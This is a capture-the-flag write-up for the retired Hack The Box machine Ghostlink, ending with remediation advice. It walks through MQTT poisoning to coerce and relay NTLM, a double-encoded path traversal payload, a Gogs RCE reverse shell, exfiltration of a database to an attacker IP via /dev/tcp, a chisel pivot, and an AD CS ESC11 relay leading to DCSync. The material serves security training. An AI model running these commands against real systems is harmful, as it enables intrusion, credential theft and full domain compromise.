# Hack The Box - Ghostlink Writeup

> A technical walkthrough of the retired Hack The Box machine **Ghostlink**.
> Flags, reusable access tokens, captured NetNTLM material, and final NT hashes are intentionally redacted.

## Machine Information

| Property | Value |
| --- | --- |
| Machine | Ghostlink |
| Difficulty | Hard |
| Operating systems | Windows Server / Linux |
| Domain | `ghostlink.htb` |
| Initial target used during the assessment | `10.129.104.10` |
| Main themes | MQTT, NTLM relay, path traversal, KeePass forensics, Gogs RCE, AD CS ESC11 |

The target IP is assigned dynamically by HTB. Replace it everywhere if your spawned instance uses a different address.

## Attack Path

```mermaid
flowchart LR
    A[Unauthenticated MQTT] --> B[Poison health-check URL]
    B --> C[Relay svc_canary NTLM]
    C --> D[Authenticated file-sharing session]
    D --> E[Double-encoded path traversal]
    E --> F[KeePass database and key file]
    F --> G[Gogs credentials]
    G --> H[CVE-2025-8110 RCE]
    H --> I[Dump Gogs database]
    I --> J[Crack nvirelli password]
    J --> K[Linux user foothold]
    K --> L[Pivot into internal network]
    L --> M[AD CS ESC11]
    M --> N[DC certificate]
    N --> O[DCSync and Domain Admin]
```



## 1. Enumeration

I first mapped the target in `/etc/hosts`:

```text
10.129.104.10 ghostlink.htb dc01.ghostlink.htb
10.129.104.10 gpz-op26-secure.ghostlink.htb
10.129.104.10 gpz-op26-toolkits.ghostlink.htb
```

An initial TCP scan exposed a domain controller, IIS, WinRM, and an unusual MQTT service:

```bash
nmap -Pn -sC -sV -p- -oA ghostlink-all 10.129.104.10
```

```text
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
636/tcp  open  ldaps
1883/tcp open  mqtt
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
9389/tcp open  adws
```

LDAP and the TLS certificate identified the domain and domain controller as:

```text
Domain: ghostlink.htb
DC:     dc01.ghostlink.htb
```

The IIS site was only a static landing page. The more interesting attack surface was MQTT on TCP/1883.

## 2. MQTT Enumeration

The broker allowed anonymous subscriptions, including wildcard access:

```bash
mosquitto_sub -h 10.129.104.10 -p 1883 -t '#' -v
```

The published telemetry revealed two internal applications:

```text
gpz-op26-secure.ghostlink.htb   - secure file-sharing service
gpz-op26-toolkits.ghostlink.htb - Gogs source-code service
```

One retained topic controlled the secure file-sharing health check:

```text
GhostProtocolZero/systems/node/secureshare/healthcheck
```

Its JSON payload included a mutable URL. Before changing it, I saved the original retained message so it could be restored after exploitation.

## 3. Coercing and Relaying `svc_canary`

I started `ntlmrelayx` against the secure application. A high HTTP port can be used when running without root:

```bash
ntlmrelayx.py \
  -t http://gpz-op26-secure.ghostlink.htb \
  --http-port 8888 \
  --no-smb-server \
  --no-rdp-server \
  --no-mssql-server \
  --no-rpc-server \
  --keep-relaying \
  -socks
```

I then replaced the retained MQTT health-check URL with my VPN address:

```bash
export TUN0_IP='<YOUR_TUN0_IP>'

mosquitto_pub -h 10.129.104.10 -p 1883 -r \
  -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' \
  -m "{\"timestamp\":\"2026-08-14T15:55:20Z\",\"node\":\"node-6\",\"telemetry\":{\"healthy\":true,\"url\":\"http://${TUN0_IP}:8888/\",\"lastCheckSecAgo\":1,\"responseCode\":\"200\",\"ip\":\"172.16.20.10\"}}"
```

The health-check worker authenticated to the supplied URL as:

```text
GHOSTLINK\svc_canary
```

The password was not practically crackable, but the HTTP authentication successfully relayed to the secure file-sharing application. `ntlmrelayx` exposed the authenticated connection through its SOCKS server.

```text
HTTP://GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80)
```

My proxy configuration was:

```text
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
```

## 4. Double URL-Encoded Path Traversal

The authenticated application offered an endpoint shaped like:

```text
GET /api/download/<file>
```

Plain traversal and once-encoded traversal returned `403`. Encoding the payload twice bypassed the filter:

```text
..\                         -> %2e%2e%5c
%2e%2e%5c                  -> %252e%252e%255c
```

A harmless proof used `C:\Windows\win.ini`:

```bash
proxychains4 -q curl --path-as-is -sS \
  'http://gpz-op26-secure.ghostlink.htb/api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569'
```

Because the relayed identity was `svc_canary`, I retrieved that user's registry hive:

```text
C:\Users\svc_canary\NTUSER.DAT
```

```bash
proxychains4 -q curl --path-as-is -sS \
  'http://gpz-op26-secure.ghostlink.htb/api/download/<DOUBLE_ENCODED_PATH_TO_NTUSER.DAT>' \
  -o ntuser.dat
```

## 5. Registry Forensics and KeePass

Regripper showed a recently opened ZIP archive:

```bash
regripper -r ntuser.dat -p recentdocs
```

```text
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
0 = db.zip
```

Recent documents also create `.lnk` files. Downloading and inspecting `db.zip.lnk` revealed the full archive path:

```bash
strings db.zip.lnk
```

```text
C:\Users\svc_canary\Documents\Operations\Management\db.zip
```

I downloaded that archive through the same double-encoded traversal. It contained both a KeePass database and its key file:

```bash
unzip -l db.zip
```

```text
.key.keyx
db.kdbx
```

Opening `db.kdbx` with `.key.keyx` exposed a valid Gogs credential for `vroth`. A deleted KeePass entry also contained a password-policy document; its minimum-length requirement became useful during offline cracking later.

## 6. Gogs Fingerprinting and CVE-2025-8110

The static asset version in the Gogs page source contained this commit hash:

```text
5084b4a9b77a506f5e287e82e945e1c6882b827a
```

That revision maps to Gogs `0.13.3`, which is vulnerable to authenticated remote code execution through [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110).

The exploit chain was:

1. Authenticate as `vroth`.
2. Create a repository and an application token.
3. Commit a symbolic link pointing to `.git/config`.
4. Use the repository contents API to overwrite the linked Git configuration.
5. Add a malicious `core.sshCommand` value.
6. Trigger Git and receive a reverse shell.

```bash
rlwrap nc -lvnp 9001
```

```bash
python3 ghostlink_gogs_exploit.py \
  -u http://gpz-op26-toolkits.ghostlink.htb \
  -lh '<YOUR_TUN0_IP>' \
  -lp 9001 \
  -U vroth \
  -P '<VROTH_PASSWORD_FROM_KEEPASS>'
```

The shell ran as the low-privileged Gogs service account:

```text
git@gpz-op26-toolkits
```

## 7. From the Gogs Service to `nvirelli`

The Gogs SQLite database was readable at:

```text
/opt/gogs/data/gogs.db
```

I transferred it for offline analysis:

```bash
# Attacker
nc -lvnp 4444 > gogs.db

# Target
cat /opt/gogs/data/gogs.db > /dev/tcp/<YOUR_TUN0_IP>/4444
```

The user records contained PBKDF2-HMAC-SHA256 password material. After converting the `nvirelli` record into Hashcat format, I applied the KeePass password-policy clue and removed candidates shorter than 20 characters:

```bash
awk 'length($0) >= 20' /usr/share/wordlists/rockyou.txt > trimmed.txt
hashcat -m 10900 nvirelli.hash trimmed.txt
```

The password cracked successfully. It worked for both the local Linux user and the corresponding domain account:

```bash
su nvirelli
```

```text
nvirelli@gpz-op26-toolkits:~$ id
uid=<REDACTED>(nvirelli) gid=<REDACTED>(nvirelli) groups=<REDACTED>
```

The user flag was present in `~/user.txt` and is intentionally omitted.

## 8. Pivoting to the Internal Network

I created a reverse SOCKS tunnel through the Linux host. On Kali:

```bash
./chisel server --reverse --port 8000
```

On `gpz-op26-toolkits`:

```bash
./chisel client <YOUR_TUN0_IP>:8000 R:1081:socks
```

Proxychains then used:

```text
[ProxyList]
socks5 127.0.0.1 1081
```

## 9. AD CS Enumeration

With the recovered domain credential, Certipy identified the internal CA:

```bash
proxychains4 -q certipy find \
  -u 'nvirelli@ghostlink.htb' \
  -p '<NVIRELLI_PASSWORD>' \
  -dc-host dc01.ghostlink.htb \
  -dc-ip 10.129.104.10 \
  -dns-tcp \
  -vulnerable \
  -stdout
```

Relevant result:

```text
CA Name: ghostlink-GPZ-OP26-SECURE-CA
DNS Name: gpz-op26-secure.ghostlink.htb
ESC11: Encryption is not enforced for ICPR requests
```

ESC11 means the CA's RPC enrollment interface accepts relayed NTLM authentication without requiring encrypted certificate requests.

## 10. ESC11 - Relaying the Domain Controller

I started an ICPR relay through the SOCKS pivot and requested the `DomainController` template:

```bash
sudo proxychains4 -q ntlmrelayx.py \
  -t rpc://172.16.20.10 \
  -rpc-mode ICPR \
  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
  -smb2support \
  --template DomainController
```

Next, I coerced `DC01$` to authenticate to the relay listener. DFSCoerce or Coercer can be used:

```bash
python3 dfscoerce.py \
  -u nvirelli \
  -p '<NVIRELLI_PASSWORD>' \
  -d ghostlink.htb \
  <YOUR_TUN0_IP> \
  dc01.ghostlink.htb
```

The relay authenticated as `GHOSTLINK/DC01$` and issued a domain-controller certificate:

```text
Authenticating connection from GHOSTLINK/DC01$ ... SUCCEED
Successfully requested certificate
Certificate written to DC01.pfx
```

## 11. Domain Compromise

Certipy used the PFX to obtain a TGT and the machine account's NT hash:

```bash
certipy auth \
  -pfx DC01.pfx \
  -dc-ip 10.129.104.10 \
  -domain ghostlink.htb
```

With the `DC01$` credential, DRSUAPI provided the Administrator secret:

```bash
secretsdump.py \
  'ghostlink.htb/DC01$@dc01.ghostlink.htb' \
  -dc-ip 10.129.104.10 \
  -hashes ':<DC01_NT_HASH>' \
  -just-dc-user Administrator
```

Finally:

```bash
evil-winrm -i dc01.ghostlink.htb \
  -u Administrator \
  -H '<ADMINISTRATOR_NT_HASH>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ghostlink\administrator
```

The root flag was read from the Administrator profile and is intentionally omitted.

## Key Takeaways

- A telemetry protocol becomes a critical control plane when clients trust mutable broker data.
- An uncrackable NetNTLM response can still be valuable when relayed to an application that accepts NTLM.
- Path validation must occur after complete decoding and canonicalization.
- Registry artifacts such as `RecentDocs` and `.lnk` files can reveal high-value files even when directory enumeration fails.
- Password-manager databases are only as safe as the storage and separation of their key material.
- Application service databases often bridge a service-account foothold to an interactive user.
- AD CS misconfiguration can turn one coerced machine authentication into full domain compromise.

## Remediation

1. Require MQTT authentication and topic-level ACLs; prevent untrusted users from modifying retained health-check messages.
2. Allow-list health-check destinations and block server-side requests to arbitrary hosts.
3. Disable NTLM where possible. Where it remains necessary, require EPA/channel binding and signing.
4. Decode and canonicalize download paths exactly once, then verify the resolved path remains inside the intended storage root.
5. Keep KeePass databases and key files in separate protected locations and avoid copying secrets into user document folders.
6. Upgrade Gogs to a version that fixes CVE-2025-8110 and review historical application tokens and repositories.
7. Enforce unique passwords across application, Linux, and Active Directory identities.
8. Enable encrypted ICPR requests on the CA and review AD CS for ESC8/ESC11 exposure.
9. Restrict coercion-capable RPC interfaces and monitor unexpected machine-account authentication.

## References

- [CVE-2025-8110 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)
- [Certipy Wiki - ESC11](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc11)
- [Impacket `ntlmrelayx`](https://github.com/fortra/impacket)
- [SpecterOps - Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

---

This writeup is intended for legal training environments and retired CTF content only.
